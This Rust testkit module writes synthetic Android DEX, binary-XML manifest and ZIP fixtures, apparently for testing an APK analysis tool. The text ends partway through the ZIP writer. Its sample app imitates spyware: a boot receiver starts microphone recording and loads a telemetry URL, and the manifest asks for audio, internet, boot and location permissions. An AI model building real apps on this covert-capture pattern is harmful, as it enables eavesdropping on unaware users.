//! Writers for synthetic fixtures (feature `testkit`): a DEX writer producing valid files with sorted id tables, a
//! correct map_list, checksum and signature. Tests patch its output to make hostile variants.

use std::collections::{BTreeMap, BTreeSet};

use sha1::{Digest, Sha1};

/// One code unit of a method body, or a symbolic reference resolved to its index when the file is written.
#[derive(Debug, Clone)]
pub enum Unit {
    Raw(u16),
    /// A 16-bit string index.
    String(String),
    /// A 32-bit string index in two units (const-string/jumbo).
    StringJumbo(String),
    Type(String),
    Field(FieldKey),
    Method(MethodKey),
    Proto(String, Vec<String>),
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub struct FieldKey {
    pub class: String,
    pub name: String,
    pub kind: String,
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub struct MethodKey {
    pub class: String,
    pub name: String,
    pub ret: String,
    pub params: Vec<String>,
}

impl MethodKey {
    pub fn new(class: &str, name: &str, ret: &str, params: &[&str]) -> Self {
        Self {
            class: class.to_owned(),
            name: name.to_owned(),
            ret: ret.to_owned(),
            params: params.iter().map(|param| (*param).to_owned()).collect(),
        }
    }
}

#[derive(Debug, Clone)]
pub struct TrySpec {
    pub start: u32,
    pub count: u16,
    pub catches: Vec<(String, u32)>,
    pub catch_all: Option<u32>,
}

#[derive(Debug, Clone)]
pub struct Code {
    pub registers: u16,
    pub ins: u16,
    pub outs: u16,
    pub units: Vec<Unit>,
    pub tries: Vec<TrySpec>,
}

#[derive(Debug, Clone)]
pub struct MethodSpec {
    pub key: MethodKey,
    pub access: u32,
    pub code: Option<Code>,
}

#[derive(Debug, Clone)]
pub struct ClassSpec {
    pub name: String,
    pub access: u32,
    pub superclass: Option<String>,
    pub interfaces: Vec<String>,
    pub source_file: Option<String>,
    pub fields: Vec<(FieldKey, u32, bool)>,
    pub methods: Vec<MethodSpec>,
}

impl ClassSpec {
    pub fn new(name: &str, superclass: &str) -> Self {
        Self {
            name: name.to_owned(),
            access: 1,
            superclass: Some(superclass.to_owned()),
            interfaces: Vec::new(),
            source_file: None,
            fields: Vec::new(),
            methods: Vec::new(),
        }
    }

    /// Adds a method; `access` 0x8 (static), 0x2 (private) or 0x10000 (constructor) makes it direct.
    pub fn method(mut self, name: &str, ret: &str, params: &[&str], access: u32, code: Option<Code>) -> Self {
        self.methods.push(MethodSpec { key: MethodKey::new(&self.name, name, ret, params), access, code });
        self
    }

    pub fn field(mut self, name: &str, kind: &str, access: u32) -> Self {
        let key = FieldKey { class: self.name.clone(), name: name.to_owned(), kind: kind.to_owned() };
        self.fields.push((key, access, access & 0x8 != 0));
        self
    }
}

fn shorty(kind: &str) -> char {
    match kind.as_bytes()[0] {
        b'L' | b'[' => 'L',
        byte => byte as char,
    }
}

fn uleb(out: &mut Vec<u8>, mut value: u32) {
    loop {
        let byte = (value & 0x7f) as u8;
        value >>= 7;
        if value == 0 {
            out.push(byte);
            return;
        }
        out.push(byte | 0x80);
    }
}

fn sleb(out: &mut Vec<u8>, mut value: i32) {
    loop {
        let byte = (value & 0x7f) as u8;
        value >>= 7;
        if (value == 0 && byte & 0x40 == 0) || (value == -1 && byte & 0x40 != 0) {
            out.push(byte);
            return;
        }
        out.push(byte | 0x80);
    }
}

fn mutf8(text: &str) -> Vec<u8> {
    let mut out = Vec::new();
    for unit in text.encode_utf16() {
        match unit {
            0x01..=0x7f => out.push(unit as u8),
            0x00 | 0x80..=0x7ff => {
                out.push(0xc0 | (unit >> 6) as u8);
                out.push(0x80 | (unit & 0x3f) as u8);
            }
            _ => {
                out.push(0xe0 | (unit >> 12) as u8);
                out.push(0x80 | ((unit >> 6) & 0x3f) as u8);
                out.push(0x80 | (unit & 0x3f) as u8);
            }
        }
    }
    out
}

fn align(out: &mut Vec<u8>, to: usize) {
    while !out.len().is_multiple_of(to) {
        out.push(0);
    }
}

fn put32(out: &mut [u8], at: usize, value: u32) {
    out[at..at + 4].copy_from_slice(&value.to_le_bytes());
}

/// Recomputes the SHA-1 signature and Adler-32 checksum of a DEX file in place.
pub fn fix_checksums(dex: &mut [u8]) {
    let digest = Sha1::digest(&dex[32..]);
    dex[12..32].copy_from_slice(&digest);
    let checksum = crate::read::adler32(&dex[12..]);
    put32(dex, 8, checksum);
}

/// Writes a DEX file (version `version`, 35 through 41) defining `classes`.
pub fn write_dex(classes: &[ClassSpec], version: u16) -> Vec<u8> {
    let mut strings: BTreeSet<String> = BTreeSet::new();
    let mut types: BTreeSet<String> = BTreeSet::new();
    let mut protos: BTreeSet<(String, Vec<String>)> = BTreeSet::new();
    let mut fields: BTreeSet<FieldKey> = BTreeSet::new();
    let mut methods: BTreeSet<MethodKey> = BTreeSet::new();
    let add_type = |types: &mut BTreeSet<String>, strings: &mut BTreeSet<String>, kind: &str| {
        types.insert(kind.to_owned());
        strings.insert(kind.to_owned());
    };
    let add_proto = |protos: &mut BTreeSet<(String, Vec<String>)>, ret: &str, params: &[String]| {
        protos.insert((ret.to_owned(), params.to_vec()));
    };
    let add_method = |key: &MethodKey,
                      strings: &mut BTreeSet<String>,
                      types: &mut BTreeSet<String>,
                      protos: &mut BTreeSet<(String, Vec<String>)>,
                      methods: &mut BTreeSet<MethodKey>| {
        add_type(types, strings, &key.class);
        add_type(types, strings, &key.ret);
        for param in &key.params {
            add_type(types, strings, param);
        }
        strings.insert(key.name.clone());
        add_proto(protos, &key.ret, &key.params);
        methods.insert(key.clone());
    };
    for class in classes {
        add_type(&mut types, &mut strings, &class.name);
        if let Some(superclass) = &class.superclass {
            add_type(&mut types, &mut strings, superclass);
        }
        for interface in &class.interfaces {
            add_type(&mut types, &mut strings, interface);
        }
        if let Some(source) = &class.source_file {
            strings.insert(source.clone());
        }
        for (key, _, _) in &class.fields {
            add_type(&mut types, &mut strings, &key.class);
            add_type(&mut types, &mut strings, &key.kind);
            strings.insert(key.name.clone());
            fields.insert(key.clone());
        }
        for method in &class.methods {
            add_method(&method.key, &mut strings, &mut types, &mut protos, &mut methods);
            for unit in method.code.iter().flat_map(|code| &code.units) {
                match unit {
                    Unit::String(text) | Unit::StringJumbo(text) => {
                        strings.insert(text.clone());
                    }
                    Unit::Type(kind) => add_type(&mut types, &mut strings, kind),
                    Unit::Field(key) => {
                        add_type(&mut types, &mut strings, &key.class);
                        add_type(&mut types, &mut strings, &key.kind);
                        strings.insert(key.name.clone());
                        fields.insert(key.clone());
                    }
                    Unit::Method(key) => add_method(key, &mut strings, &mut types, &mut protos, &mut methods),
                    Unit::Proto(ret, params) => {
                        add_type(&mut types, &mut strings, ret);
                        for param in params {
                            add_type(&mut types, &mut strings, param);
                        }
                        add_proto(&mut protos, ret, params);
                    }
                    Unit::Raw(_) => {}
                }
            }
            for spec in method.code.iter().flat_map(|code| &code.tries) {
                for (kind, _) in &spec.catches {
                    add_type(&mut types, &mut strings, kind);
                }
            }
        }
    }
    for (ret, params) in &protos {
        let short: String = std::iter::once(ret).chain(params).map(|kind| shorty(kind)).collect();
        strings.insert(short);
    }
    let string_list: Vec<String> = strings.into_iter().collect();
    let string_index: BTreeMap<&str, u32> =
        string_list.iter().enumerate().map(|(index, text)| (text.as_str(), index as u32)).collect();
    // Type ids sort by their string index, which BTreeSet order of the same strings already gives.
    let type_list: Vec<String> = types.into_iter().collect();
    let type_index: BTreeMap<&str, u32> =
        type_list.iter().enumerate().map(|(index, text)| (text.as_str(), index as u32)).collect();
    let mut proto_list: Vec<(String, Vec<String>)> = protos.into_iter().collect();
    proto_list.sort_by_key(|(ret, params)| {
        (type_index[ret.as_str()], params.iter().map(|param| type_index[param.as_str()]).collect::<Vec<_>>())
    });
    let proto_index: BTreeMap<(String, Vec<String>), u32> =
        proto_list.iter().enumerate().map(|(index, proto)| (proto.clone(), index as u32)).collect();
    let mut field_list: Vec<FieldKey> = fields.into_iter().collect();
    field_list.sort_by_key(|key| {
        (type_index[key.class.as_str()], string_index[key.name.as_str()], type_index[key.kind.as_str()])
    });
    let field_index: BTreeMap<FieldKey, u32> =
        field_list.iter().enumerate().map(|(index, key)| (key.clone(), index as u32)).collect();
    let mut method_list: Vec<MethodKey> = methods.into_iter().collect();
    method_list.sort_by_key(|key| {
        (
            type_index[key.class.as_str()],
            string_index[key.name.as_str()],
            proto_index[&(key.ret.clone(), key.params.clone())],
        )
    });
    let method_index: BTreeMap<MethodKey, u32> =
        method_list.iter().enumerate().map(|(index, key)| (key.clone(), index as u32)).collect();

    let header_size = if version >= 41 { 0x78 } else { 0x70 };
    let mut out = vec![0u8; header_size];
    let string_ids_off = out.len();
    out.resize(out.len() + string_list.len() * 4, 0);
    let type_ids_off = out.len();
    for kind in &type_list {
        out.extend_from_slice(&string_index[kind.as_str()].to_le_bytes());
    }
    let proto_ids_off = out.len();
    out.resize(out.len() + proto_list.len() * 12, 0);
    let field_ids_off = out.len();
    for key in &field_list {
        out.extend_from_slice(&(type_index[key.class.as_str()] as u16).to_le_bytes());
        out.extend_from_slice(&(type_index[key.kind.as_str()] as u16).to_le_bytes());
        out.extend_from_slice(&string_index[key.name.as_str()].to_le_bytes());
    }
    let method_ids_off = out.len();
    for key in &method_list {
        out.extend_from_slice(&(type_index[key.class.as_str()] as u16).to_le_bytes());
        out.extend_from_slice(&(proto_index[&(key.ret.clone(), key.params.clone())] as u16).to_le_bytes());
        out.extend_from_slice(&string_index[key.name.as_str()].to_le_bytes());
    }
    let class_defs_off = out.len();
    out.resize(out.len() + classes.len() * 32, 0);
    let data_off = out.len();

    // Type lists: proto parameters and interfaces.
    let mut type_lists: BTreeMap<Vec<String>, u32> = BTreeMap::new();
    let type_lists_off = out.len();
    let mut type_list_count = 0;
    let wanted_lists = proto_list
        .iter()
        .map(|(_, params)| params.clone())
        .chain(classes.iter().map(|class| class.interfaces.clone()))
        .filter(|list| !list.is_empty());
    for list in wanted_lists {
        if type_lists.contains_key(&list) {
            continue;
        }
        align(&mut out, 4);
        type_lists.insert(list.clone(), out.len() as u32);
        type_list_count += 1;
        out.extend_from_slice(&(list.len() as u32).to_le_bytes());
        for kind in &list {
            out.extend_from_slice(&(type_index[kind.as_str()] as u16).to_le_bytes());
        }
    }
    for (index, (ret, params)) in proto_list.iter().enumerate() {
        let short: String = std::iter::once(ret).chain(params).map(|kind| shorty(kind)).collect();
        let at = proto_ids_off + index * 12;
        put32(&mut out, at, string_index[short.as_str()]);
        put32(&mut out, at + 4, type_index[ret.as_str()]);
        put32(&mut out, at + 8, if params.is_empty() { 0 } else { type_lists[params] });
    }
    let string_data_off = out.len();
    for (index, text) in string_list.iter().enumerate() {
        let here = out.len() as u32;
        put32(&mut out, string_ids_off + index * 4, here);
        uleb(&mut out, text.encode_utf16().count() as u32);
        out.extend_from_slice(&mutf8(text));
        out.push(0);
    }
    align(&mut out, 4);
    let code_off = out.len();
    let mut code_count = 0;
    let mut code_offsets: BTreeMap<MethodKey, u32> = BTreeMap::new();
    for class in classes {
        for method in &class.methods {
            let Some(code) = &method.code else { continue };
            align(&mut out, 4);
            code_offsets.insert(method.key.clone(), out.len() as u32);
            code_count += 1;
            let mut units: Vec<u16> = Vec::new();
            for unit in &code.units {
                match unit {
                    Unit::Raw(value) => units.push(*value),
                    Unit::String(text) => units.push(string_index[text.as_str()] as u16),
                    Unit::StringJumbo(text) => {
                        let index = string_index[text.as_str()];
                        units.push(index as u16);
                        units.push((index >> 16) as u16);
                    }
                    Unit::Type(kind) => units.push(type_index[kind.as_str()] as u16),
                    Unit::Field(key) => units.push(field_index[key] as u16),
                    Unit::Method(key) => units.push(method_index[key] as u16),
                    Unit::Proto(ret, params) => units.push(proto_index[&(ret.clone(), params.clone())] as u16),
                }
            }
            for value in [code.registers, code.ins, code.outs, code.tries.len() as u16] {
                out.extend_from_slice(&value.to_le_bytes());
            }
            out.extend_from_slice(&0u32.to_le_bytes());
            out.extend_from_slice(&(units.len() as u32).to_le_bytes());
            for unit in &units {
                out.extend_from_slice(&unit.to_le_bytes());
            }
            if !code.tries.is_empty() {
                if units.len() % 2 == 1 {
                    out.extend_from_slice(&[0, 0]);
                }
                let mut handlers = Vec::new();
                uleb(&mut handlers, code.tries.len() as u32);
                let mut offsets = Vec::new();
                for spec in &code.tries {
                    offsets.push(handlers.len() as u16);
                    let count = spec.catches.len() as i32;
                    sleb(&mut handlers, if spec.catch_all.is_some() { -count } else { count });
                    for (kind, address) in &spec.catches {
                        uleb(&mut handlers, type_index[kind.as_str()]);
                        uleb(&mut handlers, *address);
                    }
                    if let Some(address) = spec.catch_all {
                        uleb(&mut handlers, address);
                    }
                }
                for (spec, offset) in code.tries.iter().zip(offsets) {
                    out.extend_from_slice(&spec.start.to_le_bytes());
                    out.extend_from_slice(&spec.count.to_le_bytes());
                    out.extend_from_slice(&offset.to_le_bytes());
                }
                out.extend_from_slice(&handlers);
            }
        }
    }
    let class_data_off = out.len();
    let mut class_data_count = 0;
    for (index, class) in classes.iter().enumerate() {
        let at = class_defs_off + index * 32;
        put32(&mut out, at, type_index[class.name.as_str()]);
        put32(&mut out, at + 4, class.access);
        put32(&mut out, at + 8, class.superclass.as_ref().map_or(u32::MAX, |name| type_index[name.as_str()]));
        put32(&mut out, at + 12, if class.interfaces.is_empty() { 0 } else { type_lists[&class.interfaces] });
        put32(&mut out, at + 16, class.source_file.as_ref().map_or(u32::MAX, |name| string_index[name.as_str()]));
        if class.fields.is_empty() && class.methods.is_empty() {
            continue;
        }
        let here = out.len() as u32;
        put32(&mut out, at + 24, here);
        class_data_count += 1;
        let mut statics: Vec<_> = class.fields.iter().filter(|field| field.2).collect();
        let mut instance: Vec<_> = class.fields.iter().filter(|field| !field.2).collect();
        statics.sort_by_key(|field| field_index[&field.0]);
        instance.sort_by_key(|field| field_index[&field.0]);
        let mut direct: Vec<_> =
            class.methods.iter().filter(|method| method.access & (0x8 | 0x2 | 0x1_0000) != 0).collect();
        let mut virtuals: Vec<_> =
            class.methods.iter().filter(|method| method.access & (0x8 | 0x2 | 0x1_0000) == 0).collect();
        direct.sort_by_key(|method| method_index[&method.key]);
        virtuals.sort_by_key(|method| method_index[&method.key]);
        for count in [statics.len(), instance.len(), direct.len(), virtuals.len()] {
            uleb(&mut out, count as u32);
        }
        for list in [&statics, &instance] {
            let mut previous = 0;
            for (key, access, _) in list.iter().copied() {
                let index = field_index[key];
                uleb(&mut out, index - previous);
                uleb(&mut out, *access);
                previous = index;
            }
        }
        for list in [&direct, &virtuals] {
            let mut previous = 0;
            for method in list.iter() {
                let index = method_index[&method.key];
                uleb(&mut out, index - previous);
                uleb(&mut out, method.access);
                uleb(&mut out, code_offsets.get(&method.key).copied().unwrap_or(0));
                previous = index;
            }
        }
    }
    align(&mut out, 4);
    let map_off = out.len();
    let mut map: Vec<(u16, u32, usize)> = vec![
        (0x0000, 1, 0),
        (0x0001, string_list.len() as u32, string_ids_off),
        (0x0002, type_list.len() as u32, type_ids_off),
        (0x0003, proto_list.len() as u32, proto_ids_off),
        (0x0004, field_list.len() as u32, field_ids_off),
        (0x0005, method_list.len() as u32, method_ids_off),
        (0x0006, classes.len() as u32, class_defs_off),
        (0x1001, type_list_count, type_lists_off),
        (0x2002, string_list.len() as u32, string_data_off),
        (0x2001, code_count, code_off),
        (0x2000, class_data_count, class_data_off),
        (0x1000, 1, map_off),
    ];
    map.retain(|&(_, count, _)| count > 0);
    out.extend_from_slice(&(map.len() as u32).to_le_bytes());
    for (code, count, offset) in &map {
        out.extend_from_slice(&code.to_le_bytes());
        out.extend_from_slice(&[0, 0]);
        out.extend_from_slice(&count.to_le_bytes());
        out.extend_from_slice(&(*offset as u32).to_le_bytes());
    }
    let file_size = out.len();
    out[..8].copy_from_slice(format!("dex\n0{version:02}\0").as_bytes());
    let table = |out: &mut Vec<u8>, at: usize, count: usize, offset: usize| {
        put32(out, at, count as u32);
        put32(out, at + 4, if count == 0 { 0 } else { offset as u32 });
    };
    put32(&mut out, 0x20, file_size as u32);
    put32(&mut out, 0x24, header_size as u32);
    put32(&mut out, 0x28, 0x1234_5678);
    put32(&mut out, 0x34, map_off as u32);
    table(&mut out, 0x38, string_list.len(), string_ids_off);
    table(&mut out, 0x40, type_list.len(), type_ids_off);
    table(&mut out, 0x48, proto_list.len(), proto_ids_off);
    table(&mut out, 0x50, field_list.len(), field_ids_off);
    table(&mut out, 0x58, method_list.len(), method_ids_off);
    table(&mut out, 0x60, classes.len(), class_defs_off);
    table(&mut out, 0x68, file_size - data_off, data_off);
    if version >= 41 {
        put32(&mut out, 0x70, file_size as u32);
        put32(&mut out, 0x74, 0);
    }
    fix_checksums(&mut out);
    out
}

/// The class every sample uses for the capture code.
pub const CAPTURE_CLASS: &str = "Lcom/example/recorder/Capture;";
/// The receiver the sample manifest registers for `BOOT_COMPLETED`.
pub const BOOT_RECEIVER_CLASS: &str = "Lcom/example/recorder/BootReceiver;";
/// The URL the sample's `start` method loads with const-string.
pub const SAMPLE_URL: &str = "https://telemetry.example.com/upload";

/// The sample classes: `Capture` (constructor; `start` creating an `AudioRecord`, calling `startRecording` and
/// loading [`SAMPLE_URL`]; native `nativeEncode([B)I`; `dispatch(I)I` with a packed switch; `guarded()V` with a
/// try/catch; `send(String)V`) and a `BootReceiver` whose `onReceive` calls `new Capture().start()` and
/// `Capture.guarded()`.
pub fn sample_classes() -> Vec<ClassSpec> {
    let object = "Ljava/lang/Object;";
    let audio = "Landroid/media/AudioRecord;";
    let raw = Unit::Raw;
    let start = Code {
        registers: 3,
        ins: 1,
        outs: 1,
        units: vec![
            raw(0x0022),
            Unit::Type(audio.to_owned()),
            raw(0x106e),
            Unit::Method(MethodKey::new(audio, "startRecording", "V", &[])),
            raw(0x0000),
            raw(0x011a),
            Unit::String(SAMPLE_URL.to_owned()),
            raw(0x1071),
            Unit::Method(MethodKey::new(CAPTURE_CLASS, "send", "V", &["Ljava/lang/String;"])),
            raw(0x0001),
            raw(0x000e),
        ],
        tries: Vec::new(),
    };
    let init = Code {
        registers: 1,
        ins: 1,
        outs: 1,
        units: vec![raw(0x1070), Unit::Method(MethodKey::new(object, "<init>", "V", &[])), raw(0x0000), raw(0x000e)],
        tries: Vec::new(),
    };
    let dispatch = Code {
        registers: 2,
        ins: 1,
        outs: 0,
        units: vec![
            raw(0x012b),
            raw(8),
            raw(0),
            raw(0x0012),
            raw(0x000f),
            raw(0x1012),
            raw(0x000f),
            raw(0x0000),
            raw(0x0100),
            raw(1),
            raw(0x10),
            raw(0),
            raw(5),
            raw(0),
        ],
        tries: Vec::new(),
    };
    let guarded = Code {
        registers: 1,
        ins: 0,
        outs: 0,
        units: vec![
            raw(0x0071),
            Unit::Method(MethodKey::new("Ljava/lang/System;", "nanoTime", "J", &[])),
            raw(0x0000),
            raw(0x000e),
            raw(0x000d),
            raw(0x000e),
        ],
        tries: vec![TrySpec {
            start: 0,
            count: 3,
            catches: vec![("Ljava/io/IOException;".to_owned(), 4)],
            catch_all: None,
        }],
    };
    let send = Code { registers: 1, ins: 1, outs: 0, units: vec![raw(0x000e)], tries: Vec::new() };
    let mut capture = ClassSpec::new(CAPTURE_CLASS, object)
        .method("<init>", "V", &[], 0x1_0001, Some(init))
        .method("start", "V", &[], 0x1, Some(start))
        .method("nativeEncode", "I", &["[B"], 0x101, None)
        .method("dispatch", "I", &["I"], 0x9, Some(dispatch))
        .method("guarded", "V", &[], 0x9, Some(guarded))
        .method("send", "V", &["Ljava/lang/String;"], 0x9, Some(send))
        .field("label", "Ljava/lang/String;", 0x2)
        .field("COUNT", "I", 0x19);
    capture.source_file = Some("Capture.java".to_owned());
    // onReceive: new Capture().start(); Capture.guarded();
    let on_receive = Code {
        registers: 4,
        ins: 3,
        outs: 1,
        units: vec![
            raw(0x0022),
            Unit::Type(CAPTURE_CLASS.to_owned()),
            raw(0x1070),
            Unit::Method(MethodKey::new(CAPTURE_CLASS, "<init>", "V", &[])),
            raw(0x0000),
            raw(0x106e),
            Unit::Method(MethodKey::new(CAPTURE_CLASS, "start", "V", &[])),
            raw(0x0000),
            raw(0x0071),
            Unit::Method(MethodKey::new(CAPTURE_CLASS, "guarded", "V", &[])),
            raw(0),
            raw(0x000e),
        ],
        tries: Vec::new(),
    };
    let receiver = ClassSpec::new(BOOT_RECEIVER_CLASS, "Landroid/content/BroadcastReceiver;").method(
        "onReceive",
        "V",
        &["Landroid/content/Context;", "Landroid/content/Intent;"],
        0x1,
        Some(on_receive),
    );
    vec![capture, receiver]
}

/// An attribute value for [`write_axml`].
#[derive(Debug, Clone)]
pub enum XmlValue {
    Str(String),
    Int(i64),
    Bool(bool),
}

/// An element for [`write_axml`]: attributes are `(name, in the android namespace, value)`.
#[derive(Debug, Clone, Default)]
pub struct XmlNode {
    pub name: String,
    pub attrs: Vec<(String, bool, XmlValue)>,
    pub children: Vec<XmlNode>,
}

impl XmlNode {
    pub fn new(name: &str) -> Self {
        Self { name: name.to_owned(), ..Self::default() }
    }

    pub fn android(mut self, name: &str, value: XmlValue) -> Self {
        self.attrs.push((name.to_owned(), true, value));
        self
    }

    pub fn plain(mut self, name: &str, value: XmlValue) -> Self {
        self.attrs.push((name.to_owned(), false, value));
        self
    }

    pub fn child(mut self, child: XmlNode) -> Self {
        self.children.push(child);
        self
    }
}

/// The framework attribute id of an `android:` attribute name, for the resource map.
fn attribute_id(name: &str) -> Option<u32> {
    Some(match name {
        "label" => 0x0101_0001,
        "icon" => 0x0101_0002,
        "name" => 0x0101_0003,
        "permission" => 0x0101_0006,
        "enabled" => 0x0101_000e,
        "debuggable" => 0x0101_000f,
        "exported" => 0x0101_0010,
        "process" => 0x0101_0011,
        "authorities" => 0x0101_0018,
        "priority" => 0x0101_001c,
        "minSdkVersion" => 0x0101_020c,
        "versionCode" => 0x0101_021b,
        "versionName" => 0x0101_021c,
        "targetSdkVersion" => 0x0101_0270,
        "maxSdkVersion" => 0x0101_0271,
        _ => return None,
    })
}

const ANDROID_URI: &str = "http://schemas.android.com/apk/res/android";

/// Writes `root` as binary XML with a UTF-16 string pool (UTF-8 when `utf8`), a resource map for the `android:`
/// attribute names it knows, and the android namespace declared on the root.
pub fn write_axml(root: &XmlNode, utf8: bool) -> Vec<u8> {
    fn collect(node: &XmlNode, mapped: &mut Vec<String>, other: &mut Vec<String>) {
        let add = |list: &mut Vec<String>, text: &str| {
            if !list.iter().any(|item| item == text) {
                list.push(text.to_owned());
            }
        };
        add(other, &node.name);
        for (name, android, value) in &node.attrs {
            if *android && attribute_id(name).is_some() {
                add(mapped, name);
            } else {
                add(other, name);
            }
            if let XmlValue::Str(text) = value {
                add(other, text);
            }
        }
        for child in &node.children {
            collect(child, mapped, other);
        }
    }
    let mut mapped = Vec::new();
    let mut other = vec!["android".to_owned(), ANDROID_URI.to_owned()];
    collect(root, &mut mapped, &mut other);
    other.retain(|text| !mapped.contains(text));
    let strings: Vec<String> = mapped.iter().chain(&other).cloned().collect();
    let index = |text: &str| strings.iter().position(|item| item == text).unwrap() as u32;

    let mut pool_data = Vec::new();
    let mut offsets = Vec::new();
    for text in &strings {
        offsets.push(pool_data.len() as u32);
        if utf8 {
            let units = text.encode_utf16().count();
            pool_data.push(units as u8);
            pool_data.push(text.len() as u8);
            pool_data.extend_from_slice(text.as_bytes());
            pool_data.push(0);
        } else {
            let units: Vec<u16> = text.encode_utf16().collect();
            pool_data.extend_from_slice(&(units.len() as u16).to_le_bytes());
            for unit in units {
                pool_data.extend_from_slice(&unit.to_le_bytes());
            }
            pool_data.extend_from_slice(&[0, 0]);
        }
    }
    align(&mut pool_data, 4);
    let mut pool = Vec::new();
    let strings_start = 28 + offsets.len() * 4;
    pool.extend_from_slice(&0x0001u16.to_le_bytes());
    pool.extend_from_slice(&28u16.to_le_bytes());
    pool.extend_from_slice(&((strings_start + pool_data.len()) as u32).to_le_bytes());
    pool.extend_from_slice(&(strings.len() as u32).to_le_bytes());
    pool.extend_from_slice(&0u32.to_le_bytes());
    pool.extend_from_slice(&(if utf8 { 0x100u32 } else { 0 }).to_le_bytes());
    pool.extend_from_slice(&(strings_start as u32).to_le_bytes());
    pool.extend_from_slice(&0u32.to_le_bytes());
    for offset in offsets {
        pool.extend_from_slice(&offset.to_le_bytes());
    }
    pool.extend_from_slice(&pool_data);

    let mut map = Vec::new();
    map.extend_from_slice(&0x0180u16.to_le_bytes());
    map.extend_from_slice(&8u16.to_le_bytes());
    map.extend_from_slice(&((8 + mapped.len() * 4) as u32).to_le_bytes());
    for name in &mapped {
        map.extend_from_slice(&attribute_id(name).unwrap().to_le_bytes());
    }

    let node_header = |out: &mut Vec<u8>, kind: u16, size: usize| {
        out.extend_from_slice(&kind.to_le_bytes());
        out.extend_from_slice(&16u16.to_le_bytes());
        out.extend_from_slice(&(size as u32).to_le_bytes());
        out.extend_from_slice(&1u32.to_le_bytes());
        out.extend_from_slice(&u32::MAX.to_le_bytes());
    };
    let mut body = Vec::new();
    node_header(&mut body, 0x0100, 24);
    body.extend_from_slice(&index("android").to_le_bytes());
    body.extend_from_slice(&index(ANDROID_URI).to_le_bytes());
    fn element(
        node: &XmlNode,
        out: &mut Vec<u8>,
        index: &dyn Fn(&str) -> u32,
        header: &dyn Fn(&mut Vec<u8>, u16, usize),
    ) {
        header(out, 0x0102, 36 + node.attrs.len() * 20);
        out.extend_from_slice(&u32::MAX.to_le_bytes());
        out.extend_from_slice(&index(&node.name).to_le_bytes());
        for value in [20u16, 20, node.attrs.len() as u16, 0, 0, 0] {
            out.extend_from_slice(&value.to_le_bytes());
        }
        for (name, android, value) in &node.attrs {
            let namespace = if *android { index(ANDROID_URI) } else { u32::MAX };
            out.extend_from_slice(&namespace.to_le_bytes());
            out.extend_from_slice(&index(name).to_le_bytes());
            let (raw, kind, data) = match value {
                XmlValue::Str(text) => (index(text), 0x03u8, index(text)),
                XmlValue::Int(number) => (u32::MAX, 0x10, *number as u32),
                XmlValue::Bool(flag) => (u32::MAX, 0x12, if *flag { u32::MAX } else { 0 }),
            };
            out.extend_from_slice(&raw.to_le_bytes());
            out.extend_from_slice(&8u16.to_le_bytes());
            out.push(0);
            out.push(kind);
            out.extend_from_slice(&data.to_le_bytes());
        }
        for child in &node.children {
            element(child, out, index, header);
        }
        header(out, 0x0103, 24);
        out.extend_from_slice(&u32::MAX.to_le_bytes());
        out.extend_from_slice(&index(&node.name).to_le_bytes());
    }
    element(root, &mut body, &index, &node_header);
    node_header(&mut body, 0x0101, 24);
    body.extend_from_slice(&index("android").to_le_bytes());
    body.extend_from_slice(&index(ANDROID_URI).to_le_bytes());

    let mut out = Vec::new();
    out.extend_from_slice(&0x0003u16.to_le_bytes());
    out.extend_from_slice(&8u16.to_le_bytes());
    out.extend_from_slice(&((8 + pool.len() + map.len() + body.len()) as u32).to_le_bytes());
    out.extend_from_slice(&pool);
    out.extend_from_slice(&map);
    out.extend_from_slice(&body);
    out
}

/// The sample manifest: package `com.example.recorder`, four permissions, a launcher activity, a boot receiver
/// ([`BOOT_RECEIVER_CLASS`]), a microphone foreground service and a provider.
pub fn sample_manifest() -> XmlNode {
    use XmlValue::{Bool, Int, Str};
    let permission = |name: &str| XmlNode::new("uses-permission").android("name", Str(name.to_owned()));
    let action = |name: &str| XmlNode::new("action").android("name", Str(name.to_owned()));
    let category = |name: &str| XmlNode::new("category").android("name", Str(name.to_owned()));
    XmlNode::new("manifest")
        .android("versionCode", Int(7))
        .android("versionName", Str("1.2".to_owned()))
        .plain("package", Str("com.example.recorder".to_owned()))
        .plain("platformBuildVersionCode", Int(33))
        .child(XmlNode::new("uses-sdk").android("minSdkVersion", Int(21)).android("targetSdkVersion", Int(33)))
        .child(permission("android.permission.RECORD_AUDIO"))
        .child(permission("android.permission.INTERNET"))
        .child(permission("android.permission.RECEIVE_BOOT_COMPLETED"))
        .child(permission("android.permission.ACCESS_FINE_LOCATION"))
        .child(
            XmlNode::new("application")
                .android("label", Str("Recorder".to_owned()))
                .android("usesCleartextTraffic", Bool(true))
                .child(
                    XmlNode::new("activity")
                        .android("name", Str(".MainActivity".to_owned()))
                        .android("exported", Bool(true))
                        .child(
                            XmlNode::new("intent-filter")
                                .child(action("android.intent.action.MAIN"))
                                .child(category("android.intent.category.LAUNCHER")),
                        ),
                )
                .child(
                    XmlNode::new("receiver")
                        .android("name", Str(".BootReceiver".to_owned()))
                        .android("exported", Bool(false))
                        .child(XmlNode::new("intent-filter").child(action("android.intent.action.BOOT_COMPLETED"))),
                )
                .child(
                    XmlNode::new("service")
                        .android("name", Str("com.example.recorder.CaptureService".to_owned()))
                        .android("foregroundServiceType", Int(0x80)),
                )
                .child(
                    XmlNode::new("provider")
                        .android("name", Str(".DataProvider".to_owned()))
                        .android("authorities", Str("com.example.recorder.data".to_owned()))
                        .android("exported", Bool(false)),
                ),
        )
}

const CRC_POLY: u32 = 0xedb8_8320;

fn crc32(data: &[u8]) -> u32 {
    let mut crc = u32::MAX;
    for &byte in data {
        crc ^= u32::from(byte);
        for _ in 0..8 {
            crc = if crc & 1 != 0 { (crc >> 1) ^ CRC_POLY } else { crc >> 1 };
        }
    }
    !crc
}

/// Writes a ZIP archive of `(name, content, deflate)` members, with fixed timestamps.
pub fn write_zip(members: &[(&str, &[u8], bool)]) -> Vec<u8> {
    let mut out = Vec::new();
    let mut directory = Vec::new();
    for (name, content, deflate) in members {
        let data = if *deflate {
            let mut encoder = flate2::write::DeflateEncoder::new(Vec::new(), flate2::Compression::best());
            std::io::Write::write_all(&mut encoder, content).unwrap();
            encoder.finish().unwrap()
        } else {
            content.to_vec()
        };
        let method: u16 = if *deflate { 8 } else { 0 };
        let crc = crc32(content);
        let offset = out.len() as u32;
        let common = |out: &mut Vec<u8>| {
            out.extend_from_slice(&20u16.to_le_bytes());
            out.extend_from_slice(&0u16.to_le_bytes());
            out.extend_from_slice(&method.to_le_bytes());
